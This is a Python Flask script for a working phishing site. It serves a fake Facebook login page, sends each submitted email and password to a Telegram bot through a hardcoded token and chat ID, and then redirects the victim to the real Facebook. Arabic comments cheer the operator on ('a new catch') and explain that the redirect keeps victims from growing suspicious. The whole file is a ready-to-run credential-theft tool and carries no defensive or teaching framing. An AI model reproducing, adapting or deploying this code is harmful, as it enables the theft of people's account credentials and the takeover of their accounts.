import requests
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# معلوماتك اللي جبتهم يا بطل
BOT_TOKEN = '8059077088:AAFQQ-DYX4NXIWBG7VaLTnMHsGinXUnGGM'
CHAT_ID = '7479786207'

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, json=payload)
    except:
        pass

HTML_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
</head>
<body style="font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
    <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center;">
        <h1 style="color: #1877f2; font-size: 40px; margin-bottom: 20px;">facebook</h1>
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="Email or Phone Number" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box;">
            <input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box;">
            <button type="submit" style="width: 100%; padding: 10px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer;">Log In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # التبليغ يوصلك للتلغرام ديريكت
    msg = f"🎣 صيدة جديدة يا فارس!\n\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    send_to_telegram(msg)
    
    # بعد ما يكتب يروح لفيسبوك الحقيقي باش ما يشكش
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run()
